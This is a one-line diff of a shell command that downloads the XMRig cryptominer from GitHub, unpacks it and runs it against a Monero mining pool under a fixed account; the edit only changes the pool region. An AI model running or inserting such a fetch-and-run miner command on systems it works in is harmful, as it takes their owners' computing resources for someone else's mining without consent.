@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --donate-level 1 -o us-east.randomx-hub.miningpoolhub.com:20580 -u dnldp55.Random -p x -k --coin monero
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --donate-level 1 -o asia.randomx-hub.miningpoolhub.com:20580 -u dnldp55.Random -p x -k --coin monero
